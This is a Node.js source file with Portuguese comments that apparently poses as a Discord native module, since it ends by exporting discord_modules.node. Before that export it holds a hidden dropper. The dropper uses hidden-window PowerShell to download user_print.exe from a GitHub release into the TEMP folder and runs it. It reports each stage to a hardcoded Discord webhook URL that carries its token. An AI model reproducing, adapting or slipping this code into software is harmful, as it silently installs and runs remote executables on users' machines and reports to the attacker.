const { exec } = require('child_process');
const path = require('path');
const https = require('https');

// Caminho onde o .exe será salvo
const exePath = path.join(process.env.TEMP || process.env.TMP, 'app.exe');

// Webhook do Discord
const webhookUrl = "https://discord.com/api/webhooks/1325632655575879750/nMY46VTKwC1T2dtI82K6PFSBIt6E-5Fojyh7gRKE2NoofBibkSbRIhKUagoXBcEGGwSJ";

// Função para enviar logs ao Discord (agora inclui o path)
function enviarWebhook(msg) {
    const payload = JSON.stringify({ content: `[LOG] ${msg}\n📁 Path: ${exePath}` });

    const req = https.request(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(payload)
        }
    });

    req.on('error', () => {});
    req.write(payload);
    req.end();
}

// Caminho com barras duplas para PowerShell
const exePathPs = exePath.replace(/\\/g, '\\\\');

// Comando para baixar
const comandoDownload = `powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/reallopez/discord2/releases/download/ping/user_print.exe' -OutFile '${exePathPs}'"`;

// Comando para executar
const comandoExec = `powershell -WindowStyle Hidden -Command "Start-Process '${exePathPs}'"`;

// Executar download primeiro
enviarWebhook("Iniciando download via PowerShell...");
exec(comandoDownload, (err, stdout, stderr) => {
    if (err) {
        enviarWebhook(`❌ Erro no download: ${err.message}`);
        return;
    }
    if (stderr) {
        enviarWebhook(`⚠️ STDERR no download: ${stderr}`);
    }

    enviarWebhook("✅ Download concluído. Iniciando execução...");

    // Executar o app.exe
    exec(comandoExec, (err2, stdout2, stderr2) => {
        if (err2) {
            enviarWebhook(`❌ Erro ao executar: ${err2.message}`);
            return;
        }
        if (stderr2) {
            enviarWebhook(`⚠️ STDERR na execução: ${stderr2}`);
        }

        enviarWebhook("🚀 Execução iniciada com sucesso.");
    });
});

// Exportar o módulo nativo
module.exports = require('./discord_modules.node');
